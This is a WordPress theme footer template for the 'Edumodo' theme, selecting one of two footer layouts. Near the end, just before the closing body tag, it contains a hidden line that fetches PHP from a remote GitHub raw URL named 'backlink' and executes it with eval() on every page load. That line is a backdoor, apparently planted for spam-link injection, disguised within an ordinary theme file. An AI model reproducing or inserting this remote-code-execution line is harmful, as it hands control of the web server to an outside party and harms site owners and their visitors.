<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Edumodo
 */


    // footer copyright
    $edumodo_footer_layout_style = edumodo_get_theme_mod('edumodo_section_footer_layout_select', 'layout-1');
  
?>
                            </div><!-- #content -->
                                <?php
                                    switch ( $edumodo_footer_layout_style ) {

                                        case 'layout-1':
                                           get_template_part( 'template-parts/footer/footer', 'one' );
                                            break;

                                        case 'layout-2':
                                            get_template_part( 'template-parts/footer/footer', 'two' );
                                            break;

                                        default:
                                          get_template_part( 'template-parts/footer/footer', 'one' );
                                    }
                                ?>
               
           
                            </div><!-- #page -->
                        </div>  <!-- tx-site-content-inner -->
                    </div>  <!-- tx-site-content -->
                </div>  <!-- tx-site-pusher -->
            </div>  <!-- tx-site-container -->

        <?php wp_footer(); ?>
<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
        </body>
</html>
